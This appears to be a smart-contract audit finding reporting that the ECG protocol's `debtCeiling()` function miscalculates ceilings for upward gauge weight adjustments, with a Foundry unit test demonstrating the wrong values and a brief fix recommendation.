### Impact
The `debtCeiling()` function is currently only used for calculating an adjustment down (unstaking) in gauges. However, seeing as this function is meant to take in any adjustment (up or down), 3rd party integrators or future ECG contracts that use this function can potentially receive incorrect values. 

### Proof of Concept

Place the following test inside of `/test/unit/loan/LendingTerm.t.sol`:

```solidity
    function testWrongDebtCeilingForAdjustmentUp() public {
        // add additional term
        LendingTerm term2 = LendingTerm(Clones.clone(address(new LendingTerm())));
        term2.initialize(
            address(core),
            LendingTerm.LendingTermReferences({
                profitManager: address(profitManager),
                guildToken: address(guild),
                auctionHouse: address(auctionHouse),
                creditMinter: address(rlcm),
                creditToken: address(credit)
            }),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: _INTEREST_RATE,
                maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        guild.addGauge(1, address(term2));

        // set weights for both terms
        guild.decrementGauge(address(term), _HARDCAP);
        guild.incrementGauge(address(term), 1000e18);
        guild.incrementGauge(address(term2), 1000e18);

        assertEq(guild.getGaugeWeight(address(term)), 1000e18);
        assertEq(guild.getGaugeWeight(address(term2)), 1000e18);
        assertEq(guild.totalTypeWeight(1), 2000e18);

        // simulate a borrow so `totalBorrowedCredit` > 0
        uint256 borrowAmount = 20_000e18;
        uint256 collateralAmount = 12e18;
        collateral.mint(address(this), collateralAmount);
        collateral.approve(address(term), collateralAmount);

        term.borrow(borrowAmount, collateralAmount);

        // confirm debtCeilings via `calculateGaugeAllocation` (no tolerance)
        assertEq(guild.calculateGaugeAllocation(address(term), _HARDCAP), _HARDCAP / 2); // 50% debt allocation
        assertEq(guild.calculateGaugeAllocation(address(term2), _HARDCAP), _HARDCAP / 2); // 50% debt allocation

        // confirm debtCeilings via `debtCeiling()` (with tolerance)
        // debt ceiling is 50% of totalSupply (20_000e18)
        // + 20% of tolerance (10_000e18 + 2_000e18)
        assertEq(term.debtCeiling(), 12_000e18);
        // 20_000e18 + 10_000e18 since issuance == 0
        assertEq(term2.debtCeiling(), 30_000e18);

        // simulate adjustment up via `debtCeiling()`
        assertEq(term.debtCeiling(int256(1000e18)), _HARDCAP); // gauge viewed as having 100% debt allocation after increasing by 1000e18

        // actually increase the weight of the term
        guild.incrementGauge(address(term), 1000e18);
        assertEq(guild.getGaugeWeight(address(term)), 2000e18);
        assertEq(guild.getGaugeWeight(address(term2)), 1000e18);
        assertEq(guild.totalTypeWeight(1), 3000e18);

        // confirm debtCeilings via `calculateGaugeAllocation` (no tolerance)
        assertEq(guild.calculateGaugeAllocation(address(term), _HARDCAP), 13333333333333333333333333); // ~66% debt allocation
        assertEq(guild.calculateGaugeAllocation(address(term2), _HARDCAP), 6666666666666666666666666); // ~33% debt allocation

        // confirm debtCeilings via `debtCeiling()` (with tolerance)
        // totalSupply == 20_000e18
        // ~ 66% of total supply + 20% tolerance == ~ 13_333e18 + 2_666e18
        assertEq(term.debtCeiling(), 16_000e18);
        // maxBorrow == ~ 13_333e18, since issuance == 0
        assertEq(term2.debtCeiling(), 13333333333333333333333);
    }
```

### Recommendation
If a gauge is experiencing an adjustment up, i.e. `gaugeWeightDelta > 0`, then an updated `totalWeight` should be considered (`totalWeight = totalWeight + gaugeWeightDelta`). 